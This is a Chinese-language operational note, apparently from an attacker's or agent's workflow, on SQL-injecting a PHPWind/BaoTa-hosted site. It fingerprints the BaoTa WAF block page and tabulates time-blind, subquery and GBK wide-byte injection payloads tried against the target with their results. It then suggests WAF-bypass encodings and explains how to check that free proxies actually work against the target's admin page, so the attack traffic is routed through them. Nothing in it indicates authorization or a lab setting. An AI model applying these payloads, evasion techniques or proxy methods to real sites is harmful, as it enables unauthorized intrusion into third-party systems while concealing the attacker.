## 描述

PHPWind/宝塔站点做 SQL 注入时的三类硬判据：宝塔 WAF 拦截页指纹（403|1200，即"未成功也不代表无注入"）、代理验活两级法（含 --noproxy 自杀陷阱）、以及出口被封时的重建流程。

## 用法

```
见到 `403|1200` 且正文 `网站防火墙` 时：① 判定为 WAF 拦截（≠ 注入成功/≠ 无注入）；② 改判据（布尔/报错/页长差分），或对关键字做 WAF 绕过编码；③ 千万不要用它当"参数存在注入"的证据。重建出口：`curl -x $P http://myip.ipip.net/ | grep 当前` 过第一关，再 `curl -sk -x $P https://$T/example.com -w '%{http_code}|%{size_download}'` 必须 `200|3933`。
```

## 正文

```
## 1. 判据：宝塔 WAF 拦截页指纹
命中拦截时响应固定为 `403|1200`，正文（UTF-8）含：
- `<title>网站防火墙</title>`
- `您的请求带有不合法参数，已被网站管理员设置拦截！`
- `<!--9.8.9 2026-07-22 -->` ← 版本号与规则日期

⇒ 见到这一页就是**WAF 规则拦截**，不是应用层报错、不是注入成功、不是封 IP。**不要**把它当成"这个参数有注入"的证据。

## 2. 本项目实测：SQL 关键字被整体拦死
| 请求 | 结果 |
|---|---|
| `/search.php?keyword=aaa` | 200\|3891（基线，耗时 6.2s，CC 防护） |
| `/search.php?keyword=aaa%27%0aAND%0aSLEEP(5)%23` | **403\|1200（WAF）** |
| `/search.php?keyword=aaa%27/**/AND/**/SLEEP(5)%23` | **403\|1200（WAF）** |
| `/search.php?keyword=aaa%27%20AND%20(SELECT%201%20FROM(SELECT%20SLEEP(5))x)%23` | **403\|1200（WAF）** |
| `/pw_example.com?action=getuserinfo&username=admin%27` | 200\|101（裸引号可过） |
| `...&username=admin%27%20AND%20SLEEP(3)--%20-` | 000\|0\|30s（挂死，被丢弃） |
| `...&username=admin%2540bf%27%20AND%20SLEEP(3)--%20-`（GBK 宽字节 %bf%27） | 403\|1200（WAF） |

结论：**空格+\`SLEEP\`/\`UNION\`/\`OUTFILE\` 这类关键字型载荷先被 WAF 吃掉**，时间盲注与联合写入（INTO OUTFILE）在当前编码下不可用；裸引号能过 ⇒ 需要**不出现 SQL 关键字的注入判据**（布尔差分、报错、页长差分）或换编码（注释穿插/内联注释/大小写/双重编码）才能继续。

## 3. 出口侧两个关键陷阱（本项目踩过）
1. **`curl -x PROXY --noproxy '*'` 会连带忽略显式 `-x`**，请求实际走了直连 ⇒ 出现"471 个代理全都能通""代理返回 200"的假象。**用代理时永远不要加 `--noproxy '*'`**（它只用于屏蔽环境变量代理，写法应是 `env -u ALL_PROXY -u HTTP_PROXY ...` 或干脆不设）。
2. **代理必须两级验活**：① `curl -x P http://myip.ipip.net/` 必须回 `当前 IP：x.x.x.x`（证明真是代理且能出网）；② 再打目标做业务验活（本项目：`GET https://<站点>/example.com` 必须 `200|3933` 且正文含 `admin_name` 表单，否则该出口在撒谎/被拦）。免费池 471 个候选中，真出口仅 34 个，能打通目标的仅 6 个。
```
